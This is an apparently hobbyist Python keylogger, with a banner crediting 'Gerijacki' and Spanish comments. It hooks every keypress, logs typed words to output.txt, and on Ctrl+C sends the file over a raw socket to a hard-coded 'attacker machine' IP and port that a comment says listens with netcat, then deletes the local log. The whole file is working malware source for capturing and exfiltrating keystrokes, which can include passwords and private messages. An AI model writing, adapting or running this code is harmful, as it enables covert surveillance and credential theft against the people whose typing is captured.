import keyboard
import sys
import socket
import os
from colorama import Fore, Style

# def banner_keylog():
print("""
888~-_        e      Y88b         / 888~~\  Y88b    / ~~~888~~~ 888~~  
888   \      d8b      Y88b       /  888   |  Y88b  /     888    888___ 
888    |    /Y88b      Y88b  e  /   888 _/    Y88b/      888    888    
888   /    /  Y88b      Y88bd8b/    888  \     Y8Y       888    888    
888_-~    /____Y88b      Y88Y8Y     888   |     Y        888    888    
888 ~-_  /      Y88b      Y  Y      888__/     /         888    888___ 
""")

print(f'Eina feta per Gerijacki')



# Colores de colorama:
green = Fore.GREEN
reset = Style.RESET_ALL

# Cada palabra capturada se resetea en esta variable:
palabra = ""

# Función para registrar cada palabra presionada en la variable palabra:
def on_key_event(e):

    global palabra

    if e.event_type == keyboard.KEY_DOWN:
    
        if e.name == 'space':
            guardar_palabra()
        elif len(e.name) == 1 and e.name.isprintable():
            palabra += e.name

# Cada palabra se guarda en el output.txt y se crea en caso de no existir.
def guardar_palabra():
    if not os.path.exists("output.txt"):
        # Si el archivo no existe, se crea con permisos de escritura.
        with open("output.txt", "w"):
            pass

    with open("output.txt", "a") as file:
        file.write(palabra + "\n")
    print(f'Palabra registrada: {Fore.GREEN}{palabra}{Style.RESET_ALL}')
    resetear_palabra() # Llamamos a la función que se encarga de resetear la variable después de presionar espacio.

# Función para que se vaya registrando en la variable cada palabra al presionar espacio.
def resetear_palabra():
    global palabra
    palabra = ""

# Enviamos el output.txt a una máquina atacante que esté escuchando con netcat (después de presionar control + C).
def enviar_archivo_via_sockets(archivo, direccion_ip, puerto):
    try:
        with open(archivo, 'rb') as file:
            contenido = file.read()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((direccion_ip, puerto))
            s.sendall(contenido)
            os.remove("output.txt")
            sys.exit()

    except Exception as e:
        print(f"Error al enviar el archivo: {e}")

# Se detiene el script y ahí se llama a la función anterior.
def detener_script():
    print("Script detenido por el usuario.")
    keyboard.unhook_all()  # Desvincular todos los eventos de teclado
    enviar_archivo_via_sockets(archivo_a_enviar, direccion_ip_destino, puerto_destino)

# Donde enviamos el .txt
direccion_ip_destino = '192.168.31.198'
puerto_destino = 8080
archivo_a_enviar = 'output.txt'

# Registrar la función de devolución de llamada
keyboard.hook(on_key_event)

try:
    keyboard.wait('esc')
except KeyboardInterrupt:
    # Manejar la excepción cuando se presiona Ctrl+C fuera del bucle
    detener_script()